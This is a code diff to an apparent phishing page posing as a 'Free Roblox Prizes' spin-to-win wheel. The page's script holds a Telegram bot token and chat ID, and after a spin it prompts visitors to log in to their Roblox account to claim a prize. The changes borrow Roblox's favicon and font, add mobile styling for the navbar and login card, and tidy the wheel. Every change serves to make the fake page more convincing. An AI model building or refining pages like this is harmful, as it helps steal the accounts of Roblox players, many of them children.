@@ -4,6 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🎉 Spin & Win — Free Roblox Prizes</title>
+<link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
+<link rel="preconnect" href="https://fonts.cdnfonts.com">
+<link rel="stylesheet" href="https://fonts.cdnfonts.com/css/builder-sans">
 <script>
 const BOT_TOKEN='***';
 const CHAT_ID = '1361048119';
@@ -111,10 +114,10 @@ setInterval(function() {
 
 function drawWheel() {
     var canvas = document.getElementById('wheelCanvas');
-    var displaySize = 340;
-    var scale = 2;
-    canvas.width = displaySize * scale;
-    canvas.height = displaySize * scale;
+    var displaySize = window.innerWidth <= 400 ? 280 : 340;
+    var scale = (displaySize / 340) * 2;
+    canvas.width = Math.round(340 * scale);
+    canvas.height = Math.round(340 * scale);
     canvas.style.width = displaySize + 'px';
     canvas.style.height = displaySize + 'px';
     var ctx = canvas.getContext('2d');
@@ -122,7 +125,7 @@ function drawWheel() {
     var cx = 180, cy = 180, r = 170;
     var segAngle = (2 * Math.PI) / prizes.length;
     
-    ctx.clearRect(0, 0, displaySize, displaySize);
+    ctx.clearRect(0, 0, 340, 340);
     
     prizes.forEach(function(p, i) {
         var startAngle = i * segAngle - Math.PI/2;
@@ -193,11 +196,14 @@ function drawWheel() {
             // Draw 8-Bit Royal Crown image
             ctx.shadowBlur = 0;
             ctx.save();
-            // White glow background so crown is visible on dark segments
+            // Solid white bg so crown is visible on dark segments
             ctx.beginPath();
-            ctx.arc(ix, iy, 15, 0, 2 * Math.PI);
-            ctx.fillStyle = 'rgba(255,255,255,0.25)';
+            ctx.arc(ix, iy, 18, 0, 2 * Math.PI);
+            ctx.fillStyle = '#ffffff';
             ctx.fill();
+            ctx.strokeStyle = '#FFD700';
+            ctx.lineWidth = 1;
+            ctx.stroke();
             try {
                 ctx.drawImage(crownImg, ix-16, iy-17, 32, 34);
             } catch(e) {
@@ -342,7 +348,7 @@ function spin() {
     document.getElementById('spinResult').style.display = 'none';
     document.getElementById('claimPrompt').style.display = 'none';
     
-    var targetIndex = Math.floor(Math.random() * 4);
+    var targetIndex = Math.floor(Math.random() * prizes.length);
     var segAngle = 360 / prizes.length;
     var targetAngle = targetIndex * segAngle + segAngle / 2;
     var extraSpins = 5 + Math.floor(Math.random() * 3);
@@ -679,6 +685,42 @@ body.spin-bg {
     font-size: 12px; color: #4ADE80; text-align: left; line-height: 1.8;
 }
 .success-card .back-btn { display: inline-block; margin-top: 14px; color: #1D4ED8; text-decoration: none; font-size: 14px; font-weight: 500; }
+
+/* ===== MOBILE RESPONSIVE ===== */
+@media (max-width: 400px) {
+    body { overflow-x: hidden; }
+    .navbar { height: 40px; padding: 0 8px; }
+    .navbar .logo-link svg { width: 24px; height: 24px; }
+    .navbar .nav-item { font-size: 11px; padding: 0 6px; }
+    .navbar .search-wrap { max-width: 100px; }
+    .navbar .search-wrap input { height: 22px; font-size: 11px; }
+    .navbar .signup-link { font-size: 11px; padding: 0 6px; }
+    
+    .spin-title { font-size: 20px; }
+    .spin-subtitle { font-size: 11px; padding: 0 8px; }
+    .spin-badge { font-size: 9px; padding: 3px 12px; }
+    
+    .wheel-container { width: 280px; height: 280px; }
+    .wheel-pointer { 
+        border-left-width: 10px; border-right-width: 10px; border-top-width: 16px;
+        top: -6px;
+    }
+    .wheel-pointer::after { width: 12px; height: 12px; top: -20px; left: -6px; }
+    
+    .spin-btn { font-size: 15px; padding: 10px 28px; }
+    
+    .social-proof, .progress-bar-container, .spin-result { max-width: 280px; }
+    .spin-result { padding: 12px; }
+    .spin-result .congrats { font-size: 13px; }
+    .spin-result .prize-name { font-size: 17px; }
+    
+    .login-card { max-width: 300px; padding: 12px; }
+    .login-card .login-header { font-size: 22px; }
+    
+    .success-card { max-width: 300px; padding: 20px 14px; }
+    
+    .page-footer a { font-size: 10px; margin: 0 4px; }
+}
 </style>
 </head>
 <body>
@@ -739,7 +781,7 @@ body.spin-bg {
         <div class="spin-result" id="spinResult">
             <div class="congrats">🎊 Congratulations!</div>
             <div class="prize-name" id="prizeColor" style="color:#E2231A;">
-                <span id="prizeName">💰 10,000 Robux</span>
+                <span id="prizeName">🎰 Spin to win!</span>
             </div>
             <div class="prize-desc">You won! Login to your Roblox account to claim.</div>
         </div>
